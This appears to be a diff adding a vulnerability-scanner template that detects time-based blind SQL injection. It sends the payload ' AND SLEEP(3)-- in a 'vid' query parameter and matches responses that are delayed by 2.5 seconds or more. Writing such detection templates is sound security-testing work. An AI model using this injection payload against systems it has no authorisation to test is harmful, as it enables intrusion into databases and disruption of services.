@@ -1,0 +1,19 @@
+id: sqli3-time-051
+name: 'Time-blind delay in vid'
+severity: high
+type: active
+tags:
+  - sqli
+  - injection
+  - blind
+  - time
+description: '3-second delay via vid'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      vid:
+        - ''' AND SLEEP(3)--'
+    matchers:
+      - type: time
+        ms: 2500
